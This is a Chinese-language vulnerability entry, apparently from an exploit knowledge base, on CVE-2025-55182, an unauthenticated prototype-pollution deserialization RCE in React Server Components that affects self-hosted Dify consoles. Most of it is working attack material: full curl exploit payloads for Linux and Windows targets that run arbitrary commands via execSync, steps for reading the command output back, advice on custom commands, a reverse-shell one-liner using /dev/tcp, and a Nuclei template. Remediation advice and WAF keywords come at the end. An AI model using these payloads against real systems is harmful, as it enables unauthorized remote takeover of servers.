---
id: DIFY-RSC-DESER-RCE
title: "Dify 控制台 React Server Components 反序列化 RCE（CVE-2025-55182）"
product: dify
vendor: LangGenius
version_affected: "< 1.11.1（自托管 dify-web 镜像）"
severity: CRITICAL
tags: [rce, deserialization, nextjs, react, prototype-pollution, unauthenticated]
fingerprint: ["Dify", "Next.js"]
---

## 漏洞描述

React Server Components 19.0.0、19.1.0、19.1.1、19.2.0（包括 react-server-dom-parcel、react-server-dom-turbopack、react-server-dom-webpack）在处理 Server Function 端点的 HTTP 请求时存在不安全的反序列化漏洞。Dify 的 Web 控制台基于 Next.js 构建，使用了受影响的 React Server Components 版本。

攻击者通过构造特殊的 multipart/form-data 请求，利用原型链污染触发 `process.mainModule.require('child_process').execSync()` 执行任意命令。无需任何认证。

- CVSS 评分：10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
- CWE-502: Deserialization of Untrusted Data
- EPSS: 0.86091 (99.4th percentile)

## 影响版本

- Dify 自托管版本 < 1.11.1（`langgenius/dify-web` 镜像打包了受影响的 Next.js/RSC）
- 底层受影响组件：React Server Components 19.0.0、19.1.0、19.1.1、19.2.0
- Next.js 受影响版本（参考 GHSA-9qr9-h5gf-34mp）

## 利用步骤

向 Dify 的 Next.js 前端发送构造好的 POST 请求。关键是通过 multipart 表单传递恶意序列化 payload，利用 `__proto__` 原型链污染执行系统命令。

### curl 命令 -- Linux 目标

```bash
# 替换 TARGET 为 Dify 地址，CMD 替换为要执行的命令
# 这里以执行 id 命令为例

curl -sk -X POST "http://target/" \
  -H "Next-Action: x" \
  -H "X-Nextjs-Request-Id: $(head -c 8 /dev/urandom | xxd -plain | head -c 8)" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
  -H "X-Nextjs-Html-Request-Id: $(head -c 21 /dev/urandom | xxd -plain | head -c 21)" \
  --data-binary $'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('"'"'child_process'"'"').execSync('"'"'id'"'"').toString().trim();;throw Object.assign(new Error('"'"'NEXT_REDIRECT'"'"'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--'
```

### curl 命令 -- Windows 目标

```bash
# Windows 使用 powershell 执行命令
curl -sk -X POST "http://target/" \
  -H "Next-Action: x" \
  -H "X-Nextjs-Request-Id: $(head -c 8 /dev/urandom | xxd -plain | head -c 8)" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
  -H "X-Nextjs-Html-Request-Id: $(head -c 21 /dev/urandom | xxd -plain | head -c 21)" \
  --data-binary $'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('"'"'child_process'"'"').execSync('"'"'powershell -c \\"id\\"'"'"').toString().trim();;throw Object.assign(new Error('"'"'NEXT_REDIRECT'"'"'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--'
```

### 判断命令是否执行成功

检查响应头中的 `x-action-redirect` 字段：
- 命令输出会被拼接到 `/login?a=<命令输出>` 的重定向 URL 中
- 例如执行 `echo $(expr 40000 \* 44800)` 后，重定向头会包含 `/login?a=1792000000`

```bash
# 验证示例：通过计算结果确认代码执行
# 在 payload 中使用 expr 命令计算两数乘积
# 40000 * 44800 = 1792000000
# 如果响应头包含 x-action-redirect: /login?a=1792000000，则确认 RCE
curl -sk -D - -o /dev/null "http://target/" \
  -H "Next-Action: x" \
  ... | grep -i "x-action-redirect"
```

## Payload

请求核心是 multipart 表单包含三个字段：

| 字段 | 内容 | 作用 |
|------|------|------|
| `0` | JSON payload 含原型链污染 | 定义恶意 `_prefix` 执行代码 |
| `1` | `"$@0"` | 引用字段 0 |
| `2` | `[]` | 空参数数组 |

关键 HTTP 头：
- `Next-Action: x` -- 标记为 Server Function 请求
- `X-Nextjs-Request-Id` -- 随机请求 ID
- `X-Nextjs-Html-Request-Id` -- 随机 HTML 请求 ID

### 自定义命令

修改 payload 中 `execSync('...')` 内的命令即可。注意：
- 命令输出通过 `NEXT_REDIRECT` 头回显，不适合大输出
- 反弹 shell 建议使用 `bash -c 'bash >& /dev/tcp/IP/PORT 0>&1'`
- 结果通过重定向头中的 query 参数返回，注意 URL 编码

## Nuclei 模板

```yaml
id: CVE-2025-55182

info:
  name: React Server Components - Remote Code Execution
  author: DhiyaneshDk,princechaddha,assetnote,lachlan2k,maple3142,iamnooob
  severity: critical
  description: |
    React Server Components 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including react-server-dom-parcel,
    react-server-dom-turbopack, and react-server-dom-webpack contain a remote code execution caused
    by unsafe deserialization of payloads from HTTP requests to Server Function endpoints, letting
    unauthenticated attackers execute arbitrary code remotely, exploit requires no authentication.
  impact: |
    Unauthenticated attackers can execute arbitrary code remotely, potentially leading to full system compromise.
  remediation: |
    Update to the latest version that fixes the unsafe deserialization issue.
  reference:
    - https://github.com/assetnote/react2shell-scanner
    - https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3
    - https://www.facebook.com/security/advisories/cve-2025-55182
    - http://www.openwall.com/lists/oss-security/2025/12/03/4
    - https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
    - https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp
    - https://vercel.com/changelog/cve-2025-55182
    - https://github.com/Chocapikk/CVE-2025-55182
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2025-55182
    epss-score: 0.86091
    epss-percentile: 0.99395
    cwe-id: CWE-502
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.component:"Next.js"
  tags: cve,cve2025,react,rce,nextjs,oast,kev,vkev

variables:
  request-id: "{{to_lower(rand_text_alphanumeric(8))}}"
  nextjs-html: "{{rand_text_alphanumeric(21)}}"
  num1: "{{rand_int(40000, 44800)}}"
  num2: "{{rand_int(40000, 44800)}}"
  result: "{{to_number(num1)*to_number(num2)}}"

http:
  - raw:
      - |
        @timeout 15s
        POST / HTTP/1.1
        Host: {{Hostname}}
        Next-Action: x
        X-Nextjs-Request-Id: {{request-id}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
        X-Nextjs-Html-Request-Id: {{nextjs-html}}

        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $(({{num1}}*{{num2}}))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="1"

        "$@0"
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="2"

        []
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

      - |
        @timeout 15s
        POST / HTTP/1.1
        Host: {{Hostname}}
        Next-Action: x
        X-Nextjs-Request-Id: {{request-id}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
        X-Nextjs-Html-Request-Id: {{nextjs-html}}

        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('powershell -c \"{{num1}}*{{num2}}\"').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="1"

        "$@0"
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="2"

        []
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

    stop-at-first-match: true
    redirects: true

    matchers:
      - type: dsl
        dsl:
          - "contains(to_lower(header), 'x-action-redirect: /login?a={{result}}')"
# digest: 4a0a00473045022100fa3be467fcc04c6cad66547eff30d6eee9bd52273e0d2dfc3ed8010d3e87226902204ed3b7654c0a715d51e578bd16de94327ed0450d3581f881a86bd35575633f30:922c64590222798bb761d5b6d8e72950
```

## 修复建议

1. 升级 React Server Components 到修复版本（19.2.1+）
2. 升级 Next.js 到不受影响的版本
3. WAF 规则拦截包含 `__proto__`、`execSync`、`child_process` 的请求
4. 限制 Next.js Server Actions 的访问（如需要可禁用）
5. 监控异常的 `Next-Action` 请求头和 `x-action-redirect` 响应头

## 参考链接

- https://github.com/assetnote/react2shell-scanner
- https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3
- https://www.facebook.com/security/advisories/cve-2025-55182
- http://www.openwall.com/lists/oss-security/2025/12/03/4
- https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
- https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp
- https://vercel.com/changelog/cve-2025-55182
- https://github.com/Chocapikk/CVE-2025-55182
